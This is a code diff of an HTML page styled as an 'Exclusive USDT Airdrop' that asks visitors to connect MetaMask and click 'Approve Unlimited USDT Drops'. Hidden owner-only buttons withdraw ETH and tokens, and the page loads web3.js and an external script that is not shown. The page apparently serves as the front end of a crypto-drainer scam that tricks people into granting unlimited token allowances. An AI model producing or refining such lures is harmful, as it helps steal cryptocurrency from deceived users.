@@ -1,35 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MetaMask Airdrop</title>
-
-    <!-- Link to external CSS file for styling -->
-    <link rel="stylesheet" href="styles.css">
-
-    <!-- Web3.js script to interact with MetaMask -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exclusive Airdrop Opportunity</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h1>MetaMask Airdrop</h1>
-
-    <!-- Buttons for user interaction -->
-    <button id="connectButton">Connect MetaMask</button>
-    <button id="approveButton" disabled>Approve Tokens</button>
-    <button id="claimAirdropButton" disabled>Claim Airdrop</button>
-    
-    <!-- Processing message -->
-    <div id="processingMessage" style="display:none;">Processing...</div>
-    
-    <!-- Owner-specific buttons -->
-    <div id="ownerButtons" style="display:none;">
-        <button id="withdrawETHButton">Withdraw ETH</button>
-        <button id="withdrawTokensButton">Withdraw Tokens</button>
+  <div class="container">
+    <h1>🎉 Exclusive USDT Airdrop Just For You! 🎉</h1>
+    <h2>Claim your rewards today and start your journey to success!</h2>
+    <button id="connectButton" class="btn">Connect to MetaMask</button>
+    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>
+    <div class="claim-btn-container">
+      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
+      <div id="processingMessage" class="processing">Processing...</div>
     </div>
-
-    <!-- Link to your external JS file -->
-    <script src="script.js"></script>
+    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
+      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
+      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
+    </div>
+    <div class="footer">
+      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
+      <p>Need help? <a href="#">Contact Us</a></p>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
+  <script src="script.js"></script>
 </body>
 </html>
+
 
